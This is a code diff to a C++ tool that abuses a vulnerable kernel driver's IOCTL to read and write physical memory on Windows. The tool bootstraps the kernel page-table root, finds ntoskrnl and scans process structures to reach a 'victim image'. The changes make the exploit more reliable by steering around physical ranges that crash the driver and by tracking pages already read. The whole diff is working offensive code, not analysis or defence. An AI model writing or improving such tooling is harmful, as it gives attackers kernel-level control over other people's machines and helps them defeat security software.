@@ -14,6 +14,7 @@
 #include <memory>
 #include <algorithm>
 #include <vector>
+#include <unordered_set>
 
 #ifdef min
 #undef min
@@ -26,12 +27,16 @@ static constexpr uint64_t MYPORT_PDPTE_1GB_ADDR_MASK = 0x000FFFFFC0000000ULL;
 static constexpr uint64_t MYPORT_PDE_2MB_ADDR_MASK = 0x000FFFFFFFE00000ULL;
 
 static bool MyPortPaBacked(uint64_t pa, uint32_t bytes);
+// Pages successfully read this process. After CR3 bootstrap, a new page is refused:
+// IOCTL 0x9C406680 MmMapIoSpace's and derefs NULL (0x3B at MyPortIO+0x25a4).
+static std::unordered_set<uint64_t> g_myportProvenPages;
+static bool g_myportAllowNewPages = true;
 
 static bool MyPortRead32(HANDLE h, uint64_t pa, uint32_t* out) {
     if (!MyPortPaBacked(pa, 4)) return false;
-    // IOCTL 0x9C406680 MmMapIoSpace's then dereferences with no NULL check.
-    // A hole bugchecks 0x3B at MyPortIO_x64+0x25a4 (dump 111326-11531).
     if (pa > 0xFFFFFFFCu) return false;
+    uint64_t page = pa >> 12;
+    if (!g_myportAllowNewPages && !g_myportProvenPages.count(page)) return false;
     uint8_t pkt[16]{};
     *reinterpret_cast<uint64_t*>(pkt) = pa;
     *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
@@ -39,11 +44,13 @@ static bool MyPortRead32(HANDLE h, uint64_t pa, uint32_t* out) {
     if (!DeviceIoControl(h, MYPORT_IOCTL_READ, pkt, 12, pkt, 12, &got, nullptr))
         return false;
     *out = *reinterpret_cast<uint32_t*>(pkt);
+    g_myportProvenPages.insert(page);
     return true;
 }
 
 static bool MyPortWrite32(HANDLE h, uint64_t pa, uint32_t value) {
     if (!MyPortPaBacked(pa, 4)) return false;
+    if (!g_myportProvenPages.count(pa >> 12)) return false;
     uint8_t pkt[16]{};
     *reinterpret_cast<uint64_t*>(pkt) = pa;
     *reinterpret_cast<uint32_t*>(pkt + 8) = 4;
@@ -153,8 +160,15 @@ static bool MyPortInRange(uint64_t addr, const std::vector<MyPortRange>& ranges)
     return false;
 }
 
+// ISA hole plus the first extended page. MmMapIoSpace(0x100000) returns NULL and
+// MyPortIO+0x25a4 bugchecks (DriverLab-E, 2026-11-14).
+static bool MyPortPaForbidden(uint64_t pa) {
+    return pa >= 0xA0000ull && pa < 0x200000ull;
+}
+
 static bool MyPortPaBacked(uint64_t pa, uint32_t bytes) {
     if (!bytes || pa > 0xFFFFFFFFull || bytes - 1 > 0xFFFFFFFFull - pa) return false;
+    if (MyPortPaForbidden(pa) || MyPortPaForbidden(pa + bytes - 1)) return false;
     static const std::vector<MyPortRange> ranges = MyPortRanges();
     if (ranges.empty()) return false;
     return MyPortInRange(pa, ranges) && MyPortInRange(pa + bytes - 1, ranges);
@@ -208,6 +222,8 @@ static uint64_t MyPortBootstrapCR3(HANDLE h) {
     printf("[*] ntoskrnl VA=0x%llx\n", (unsigned long long)ntVA);
     auto ranges = MyPortRanges();
     if (ranges.empty()) return 0;
+    for (const auto& r : ranges)
+        printf("[*] RAM 0x%llx-0x%llx\n", (unsigned long long)r.lo, (unsigned long long)r.hi);
     auto validate = [&](uint64_t c) -> bool {
         uint64_t pa = MyPortVirtToPhysSafe(h, c, ntVA, ranges);
         if (!pa) return false;
@@ -226,7 +242,7 @@ static uint64_t MyPortBootstrapCR3(HANDLE h) {
            (unsigned long long)kScanHi);
     for (const auto& range : ranges) {
         if (cr3) break;
-        uint64_t lo = range.lo > 0x100000ull ? range.lo : 0x100000ull;
+        uint64_t lo = range.lo > 0x200000ull ? range.lo : 0x200000ull;
         uint64_t hi = range.hi < kScanHi ? range.hi : kScanHi;
         lo = (lo + 0xFFF) & ~0xFFFULL;
         hi &= ~0xFFFULL;
@@ -255,7 +271,10 @@ static uint64_t MyPortBootstrapCR3(HANDLE h) {
         }
         }
     }
-    printf("[+] MyPort CR3=0x%llx\n", (unsigned long long)cr3);
+    printf("[+] MyPort CR3=0x%llx proven_pages=%zu\n",
+           (unsigned long long)cr3, g_myportProvenPages.size());
+    // Pages outside 0xA0000-0x200000 stay readable. Locking to proven pages
+    // blocked the victim image, which is not in the EPROCESS scan window.
     return cr3;
 }
 
